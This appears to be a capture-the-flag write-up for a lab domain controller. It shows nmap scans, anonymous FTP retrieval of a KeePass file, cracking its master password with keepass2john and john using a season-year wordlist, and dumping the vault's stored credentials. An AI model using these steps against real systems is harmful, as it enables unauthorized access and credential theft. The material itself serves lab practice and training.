# Host file setup
```python
sudo nxc smb 10.129.234.50 --generate-hosts-file /etc/hosts                                  
[sudo] password for kali: 
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```
This has added an entry into /etc/hosts

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.234.50                                                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 15:37 +0000
Nmap scan report for 10.129.234.50
Host is up (0.016s latency).
Not shown: 65507 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
61025/tcp open  unknown
64959/tcp open  unknown
64960/tcp open  unknown
64966/tcp open  unknown
64976/tcp open  unknown
64978/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
```

## Nmap
```python
nmap -p 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=2000 -sT dc.redelegate.vl
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 15:40 +0000
Nmap scan report for dc.redelegate.vl (10.129.234.50)
Host is up (0.015s latency).
rDNS record for 10.129.234.50: DC.redelegate.vl

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-22 15:40:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2026-03-21T15:36:18
|_Not valid after:  2026-09-20T15:36:18
|_ssl-date: 2026-03-22T15:40:40+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-22T15:40:32+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows Server 2016 or Server 2019 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1703 (90%), Windows Server 2019 (90%), Microsoft Windows 10 1909 - 2004 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Looks like ive got anonymous FTP access

# FTP (21)
```python
ftp dc.redelegate.vl
Connected to DC.redelegate.vl.
220 Microsoft FTP Service
Name (dc.redelegate.vl:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||56810|)
125 Data connection already open; Transfer starting.
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> 
```
Found some interesting stuff

Ill transfer all this to my machine, i can do this with `mget`

```python
cat TrainingAgenda.txt 
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```
Found a potential password `SeasonYear!` hint

Ill use AI to generate me a wordlist

```python
kpcli --kdb Shared.kdbx
Provide the master password: 
```
As seen here is requires a master password

```python
keepass2john ftp/Shared.kdbx | tee -a Shared.kdbx.hash
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca4e19
```
This has generate me a hash to crack 

This still isnt working

After doing some research i found that from FTP you should always install the binary

This may be the issue is that the file itself is corrupted

```python
ftp> bin
200 Type set to I.
ftp> get Shared.kdbx
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||54798|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************|  2622       33.13 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (33.09 KiB/s)
```
I chnaged the mode and re downloaded it

```python
keepass2john Shared.kdbx > ../kdbx.hash
```
Now i can try to crack it again......

```python
john kdbx.hash --wordlist=seasonyear.txt                                          
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared)     
1g 0:00:00:01 DONE (2026-03-22 17:01) 0.9009g/s 49.54p/s 49.54c/s 49.54C/s Autumn2021!..Winter2025!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now its cracked!

```python
kpcli --kdb ftp/Shared.kdbx            
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```
Now i have access to the database

```python
kpcli:/Shared> ls
=== Groups ===
Finance/
HelpDesk/
IT/
kpcli:/Shared> cd Finance/
kpcli:/Shared/Finance> ls
=== Entries ===
0. Payrol App                                                             
1. Timesheet Manager                                                      
kpcli:/Shared/Finance> show -a 0

Title: Payrol App
Uname: Payroll
 Pass: cVkqz4bCM7kJRSNlgx2G
  URL: 
Notes: 
Icon#: 0
Creat: 2024-10-20 12:13:50
Modif: 2024-10-20 12:14:11
Xpire: Never

kpcli:/Shared/Finance> show -a 1

Title: Timesheet Manager
Uname: Timesheet
 Pass: hMFS4I0Kj8Rcd62vqi5X
  URL: 
Notes: 
Icon#: 0
Creat: 2024-10-20 12:13:30
Modif: 2024-10-20 12:14:18
Xpire: Never

kpcli:/Shared/Finance> cd ../HelpDesk/
kpcli:/Shared/HelpDesk> ls
=== Entries ===
0. KeyFob Combination                                                     
kpcli:/Shared/HelpDesk> show -a 0

Title: KeyFob Combination
Uname: 
 Pass: 22331144
  URL: 
Notes: 
Icon#: 0
Creat: 2024-10-20 12:12:09
Modif: 2024-10-20 12:12:32
Xpire: Never

kpcli:/Shared/HelpDesk> cd ../IT/
kpcli:/Shared/IT> ls
=== Entries ===
0. FS01 Admin                                                             
1. FTP                                                                    
2. SQL Guest Access                                                       
3. WEB01                                                                  
kpcli:/Shared/IT> show -a 0

Title: FS01 Admin
Uname: Administrator
 Pass: Spdv41gg4BlBgSYIW1gF
  URL: 
Notes: 
Icon#: 0
Creat: 2024-10-20 07:57:02
Modif: 2024-10-20 07:57:21
Xpire: Never

kpcli:/Shared/IT> show -a 1

Title: FTP
Uname: FTPUser
 Pass: SguPZBKdRyxWzvXRWy6U
  URL: 
Notes: Deprecated
Icon#: 0
Creat: 2024-10-20 07:56:20
Modif: 2024-10-20 07:56:58
Xpire: Never

kpcli:/Shared/IT> show -a 2

Title: SQL Guest Access
Uname: SQLGuest
 Pass: zDPBpaF4FywlqIv11vii
  URL: 
Notes: 
Icon#: 0
Creat: 2024-10-20 08:26:48
Modif: 2024-10-20 08:27:09
Xpire: Never

kpcli:/Shared/IT> show -a 3

Title: WEB01
Uname: WordPress Panel
 Pass: cn4KOEgsHqvKXPjEnSD9
  URL: 
Notes: 
Icon#: 0
Creat: 2024-10-20 07:57:24
Modif: 2024-10-20 08:00:25
Xpire: Never

kpcli:/Shared/IT>
```
I now have a bunch of passwords

Ill put all these into a passwords file

```python
cVkqz4bCM7kJRSNlgx2G
hMFS4I0Kj8Rcd62vqi5X
22331144
Spdv41gg4BlBgSYIW1gF
SguPZBKdRyxWzvXRWy6U
zDPBpaF4FywlqIv11vii
cn4KOEgsHqvKXPjEnSD9
```
I can now continue with my enumeration

# HTTP (80)
It appears to be just a default IIS server

After searching for subdomains and hidden directories i found nothing so ill move on from here

# SMB (445)
Null auth is enabled but cannot use it to find users or list shares

Guest account is disabled

# LDAP (389)
No anonymous bind

Not able to do anything with LDAP

Now after reviewing where the creds go i see that port 1433 is open and NMAP MISSED IT!

